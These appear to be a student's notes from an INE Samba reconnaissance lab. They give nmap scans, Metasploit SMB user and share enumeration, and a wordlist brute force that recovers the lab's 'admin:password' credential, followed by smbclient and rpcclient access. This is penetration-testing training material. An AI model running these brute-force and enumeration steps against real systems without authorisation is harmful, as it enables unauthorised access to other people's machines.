@@ -1,0 +1,226 @@
+Step 1:
+──(root㉿INE)-[~]
+└─# nmap demo.ine.local
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-28 16:17 IST
+  Nmap scan report for demo.ine.local (192.77.240.3)
+  Host is up (0.000025s latency).
+  Not shown: 998 closed tcp ports (reset)
+  PORT    STATE SERVICE
+  139/tcp open  netbios-ssn
+  445/tcp open  microsoft-ds
+  MAC Address: 02:42:C0:4D:F0:03 (Unknown)
+  
+  Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
+
+┌──(root㉿INE)-[~]
+└─# nmap -sU --top-ports 25 demo.ine.local
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-28 16:18 IST
+  Nmap scan report for demo.ine.local (192.77.240.3)
+  Host is up (0.000090s latency).
+  
+  PORT      STATE         SERVICE
+  53/udp    closed        domain
+  67/udp    closed        dhcps
+  68/udp    closed        dhcpc
+  69/udp    closed        tftp
+  111/udp   closed        rpcbind
+  123/udp   closed        ntp
+  135/udp   closed        msrpc
+  137/udp   open          netbios-ns
+  138/udp   open|filtered netbios-dgm
+  139/udp   closed        netbios-ssn
+  161/udp   closed        snmp
+  162/udp   closed        snmptrap
+  445/udp   closed        microsoft-ds
+  500/udp   closed        isakmp
+  514/udp   closed        syslog
+  520/udp   closed        route
+  631/udp   closed        ipp
+  998/udp   closed        puparp
+  1434/udp  closed        ms-sql-m
+  1701/udp  closed        L2TP
+  1900/udp  closed        upnp
+  4500/udp  closed        nat-t-ike
+  5353/udp  closed        zeroconf
+  49152/udp closed        unknown
+  49154/udp closed        unknown
+  MAC Address: 02:42:C0:4D:F0:03 (Unknown)
+  
+  Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
+
+┌──(root㉿INE)-[~]
+└─# nmap -sS -Pn -A -T5 demo.ine.local
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-28 16:21 IST
+  Nmap scan report for demo.ine.local (192.77.240.3)
+  Host is up (0.000067s latency).
+  Not shown: 998 closed tcp ports (reset)
+  PORT    STATE SERVICE     VERSION
+  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
+  445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: RECONLABS)
+  MAC Address: 02:42:C0:4D:F0:03 (Unknown)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: Host: SAMBA-RECON
+  
+  Host script results:
+  | smb-os-discovery: 
+  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+  |   Computer name: demo
+  |   NetBIOS computer name: SAMBA-RECON\x00
+  |   Domain name: ine.local
+  |   FQDN: demo.ine.local
+  |_  System time: 2025-04-28T10:51:19+00:00
+  |_nbstat: NetBIOS name: SAMBA-RECON, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+  | smb2-security-mode: 
+  |   3:1:1: 
+  |_    Message signing enabled but not required
+  | smb2-time: 
+  |   date: 2025-04-28T10:51:19
+  |_  start_date: N/A
+  | smb-security-mode: 
+  |   account_used: guest
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: disabled (dangerous, but default)
+  
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   0.07 ms demo.ine.local (192.77.240.3)
+  
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
+
+Step 2: 
+msf6 > setg RHOSTS demo.ine.local (global set)
+msf6 > search smb_version
+
+  Matching Modules
+  ================
+  
+     #  Name                               Disclosure Date  Rank    Check  Description
+     -  ----                               ---------------  ----    -----  -----------
+     0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection
+  
+  
+  Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
+
+msf6 > use 0
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS demo.ine.local
+  RHOSTS => demo.ine.local
+  msf6 auxiliary(scanner/smb/smb_version) > exploit
+
+  [*] 192.77.240.3:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{626d6173-2d61-6572-636f-6e0000000000}) (authentication domain:SAMBA-RECON)
+  [*] 192.77.240.3:445      -   Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
+  [*] demo.ine.local:       - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
+  [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOST demo.ine.local
+  RHOST => demo.ine.local
+msf6 auxiliary(scanner/smb/smb_enumusers) > exploit
+
+  [*] 192.77.240.3:445 - Using automatically identified domain: SAMBA-RECON
+  [+] 192.77.240.3:445 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
+  [+] 192.77.240.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
+  [*] demo.ine.local:445 - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_login
+  [*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS demo.ine.local
+  RHOSTS => demo.ine.local
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER admin
+  SMBUSER => admin
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+  PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf6 auxiliary(scanner/smb/smb_login) > exploit
+  
+  [*] 192.77.240.3:445      - 192.77.240.3:445 - Starting SMB login bruteforce
+  [-] 192.77.240.3:445      - 192.77.240.3:445 - Failed: '.\admin:admin',
+  [-] 192.77.240.3:445      - 192.77.240.3:445 - Failed: '.\admin:123456',
+  [-] 192.77.240.3:445      - 192.77.240.3:445 - Failed: '.\admin:12345',
+  [-] 192.77.240.3:445      - 192.77.240.3:445 - Failed: '.\admin:123456789',
+  [+] 192.77.240.3:445      - 192.77.240.3:445 - Success: '.\admin:password'
+  [*] demo.ine.local:445    - Scanned 1 of 1 hosts (100% complete)
+  [*] demo.ine.local:445    - Bruteforce completed, 1 credential was successful.
+  [*] demo.ine.local:445    - You can open an SMB session with these credentials and CreateSession set to true
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_login) > setg RHOSTS demo.ine.local
+  RHOSTS => demo.ine.local
+msf6 auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/smb/smb_enumshares
+  [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+
+msf6 auxiliary(scanner/smb/smb_enumshares) > exploit
+  
+  [+] 192.77.240.3:139 - public - (DISK) 
+  [+] 192.77.240.3:139 - john - (DISK) 
+  [+] 192.77.240.3:139 - aisha - (DISK) 
+  [+] 192.77.240.3:139 - emma - (DISK) 
+  [+] 192.77.240.3:139 - everyone - (DISK) 
+  [+] 192.77.240.3:139 - IPC$ - (IPC|SPECIAL) IPC Service (samba.recon.lab)
+  [*] demo.ine.local: - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+┌──(root㉿INE)-[~]
+└─# nmblookup -A demo.ine.local
+  Looking up status of 192.77.240.3
+          SAMBA-RECON     <00> -         H <ACTIVE> 
+          SAMBA-RECON     <03> -         H <ACTIVE> 
+          SAMBA-RECON     <20> -         H <ACTIVE> 
+          ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> 
+          RECONLABS       <00> - <GROUP> H <ACTIVE> 
+          RECONLABS       <1d> -         H <ACTIVE> 
+          RECONLABS       <1e> - <GROUP> H <ACTIVE> 
+  
+          MAC Address = 00-00-00-00-00-00
+
+
+Step 3:
+--With credentials
+┌──(root㉿INE)-[~]
+└─# smbclient //demo.ine.local/public -U admin                                                                                                            
+  Password for [WORKGROUP\admin]:
+  Try "help" to get a list of possible commands.
+  smb: \> ls
+    .                                   D        0  Tue Nov 27 19:06:13 2018
+    ..                                  D        0  Tue Nov 27 19:06:13 2018
+    secret                              D        0  Tue Nov 27 19:06:13 2018
+    dev                                 D        0  Tue Nov 27 19:06:13 2018
+  
+                  1981311780 blocks of size 1024. 87480812 blocks available
+  smb: \> get secret
+  NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \secret
+
+--Anonymous
+┌──(root㉿INE)-[~]
+└─# smbclient -L demo.ine.local -N                                                                                                                       
+
+          Sharename       Type      Comment
+          ---------       ----      -------
+          public          Disk      
+          john            Disk      
+          aisha           Disk      
+          emma            Disk      
+          everyone        Disk      
+          IPC$            IPC       IPC Service (samba.recon.lab)
+  Reconnecting with SMB1 for workgroup listing.
+  
+          Server               Comment
+          ---------            -------
+  
+          Workgroup            Master
+          ---------            -------
+          RECONLABS            SAMBA-RECON
+
+┌──(root㉿INE)-[~]
+└─# rpcclient -U "" -N demo.ine.local                                                                                                                      
+rpcclient $> enumdomusers
+
+
+EXTRA TOOLS
+-nmap --script smb-os-discovery.nse -p 445 demo.ine.local
